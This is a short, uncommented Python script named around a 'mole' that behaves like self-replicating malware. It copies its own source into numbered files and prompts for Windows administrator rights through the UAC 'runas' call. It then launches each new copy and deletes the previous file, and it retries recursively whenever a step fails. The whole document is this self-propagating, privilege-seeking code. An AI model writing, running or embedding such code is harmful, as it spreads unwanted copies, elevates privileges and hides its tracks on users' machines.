times = 0
PATH = ''
import sys,subprocess,ctypes,os
times = times+1
this = __file__
def self_copy():
    with open(__file__, 'r')as this_file:
        this = this_file.readlines()[2:]
    temp = ''
    for x in this:
        temp = temp+x
    this = temp
    with open("mole"+str(times)+".py", 'w')as file:
        file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))
def mole(mole):
    if ctypes.windll.shell32.IsUserAnAdmin():
        pass
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit()
    print('this is the %s mole!' % (times-1))
    mole()
@mole
def change():
    try:
        self_copy()
    except:
        change()
    try:
        subprocess.Popen("python mole"+str(times)+".py")
    except:
        change()
    else:
        os.remove(__file__)
